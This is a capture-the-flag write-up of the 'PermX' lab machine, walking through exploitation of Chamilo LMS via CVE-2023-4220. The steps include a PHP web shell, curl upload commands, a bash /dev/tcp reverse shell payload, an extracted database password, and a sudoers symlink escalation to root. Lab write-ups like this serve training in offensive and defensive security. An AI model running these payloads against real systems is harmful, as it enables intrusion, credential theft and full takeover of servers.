

# PermX Writeup

## Overview
**Machine Name:** PermX  
**Date:** 24th October 2024  
**Difficulty:** Easy  

## Synopsis
PermX is an Easy difficulty Linux machine featuring a learning management system vulnerable to unrestricted file uploads via **CVE-2023-4220**. This vulnerability is leveraged to gain a foothold on the machine. Enumerating the machine reveals credentials that lead to **SSH access**. A **sudo misconfiguration** is then exploited to gain a root shell.

## Skills Required
- Linux Command Line
- Web Enumeration

## Skills Learned
- Linux Enumeration
- Sudo Exploitation

---

## Enumeration
### **Nmap Scan**
Scanning the target with **Nmap** reveals two open TCP ports:
- **Port 22**: SSH (OpenSSH 8.9p1 Ubuntu)
- **Port 80**: Apache web server

```bash
ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.11.23 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -Pn -sC -sV 10.10.11.23
```

Output:
```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp  open  http    Apache/2.4.52
```
To access the web server, add the domain to the **hosts file**:
```bash
echo "10.10.11.23  permx.htb" | sudo tee -a /etc/hosts
```

### **Subdomain Enumeration**
Using **ffuf** to enumerate subdomains:
```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt \
-H "Host: FUZZ.permx.htb" -u http://permx.htb -t 200 -ic
```

Identified subdomains:
- `www.permx.htb`
- `lms.permx.htb`

Adding the LMS subdomain to `/etc/hosts`:
```bash
echo "10.10.11.23  lms.permx.htb" | sudo tee -a /etc/hosts
```

---

## Exploitation
### **CVE-2023-4220 - Unrestricted File Upload**
Chamilo LMS is vulnerable to **unauthenticated file upload**.

Creating a **PHP web shell**:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
Uploading the web shell:
```bash
curl -F 'bigUploadFile=@shell.php' \
'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
```
Verifying execution:
```bash
curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/shell.php?cmd=id'
```
Expected output:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
### **Reverse Shell**
Starting a **Netcat listener**:
```bash
nc -lnvp {{PORT}}
```
Creating and uploading a **reverse shell payload**:
```bash
echo '<?php system("bash -c \'bash -i >& /dev/tcp/{{IP}}/{{PORT}} 0>&1\'"); ?>' > rev.php
curl -F 'bigUploadFile=@rev.php' \
'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
```
Triggering the reverse shell:
```bash
curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rev.php'
```
Successful connection on **Netcat listener**:
```
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.23] 39022
```

### **Obtaining User Credentials**
Dumping the **Chamilo configuration file**:
```bash
cat /var/www/chamilo/app/config/configuration.php
```
Extracted credentials:
```
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
```
Using these credentials to SSH into the server:
```bash
ssh mtz@permx.htb
```
Obtaining the **user flag**:
```bash
cat user.txt
```

---

## Privilege Escalation
### **Sudo Misconfiguration**
Checking sudo privileges:
```bash
sudo -l
```
Output:
```
User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```
Inspecting **acl.sh**:
```bash
cat /opt/acl.sh
```
The script modifies file **ACLs** in `/home/mtz/` and allows arbitrary file access.

### **Exploiting ACL Misconfiguration**
Creating a **symbolic link** to `/etc/sudoers`:
```bash
ln -s /etc/sudoers /home/mtz/root
```
Granting write permissions via `acl.sh`:
```bash
sudo /opt/acl.sh mtz rw /home/mtz/root
```
Appending a **new sudo rule** to escalate privileges:
```bash
echo "mtz ALL=(ALL:ALL) NOPASSWD: ALL" >> /home/mtz/root
```
Getting a **root shell**:
```bash
sudo bash
```
Confirming root access:
```bash
id
```
Expected output:
```
uid=0(root) gid=0(root) groups=0(root)
```
Extracting the **root flag**:
```bash
cat /root/root.txt
```

---

## Conclusion
- **Gained foothold** using CVE-2023-4220 file upload vulnerability.
- **Escalated privileges** via a misconfigured ACL script.
- **Successfully rooted** the machine and obtained all required flags.

**Key Takeaways:**
- Always sanitize file uploads to prevent **RCE vulnerabilities**.
- Ensure **sudo permissions** do not allow unrestricted execution of scripts that manipulate system files.
- Enforce **least privilege principles** to reduce risk exposure.

**End of Writeup**
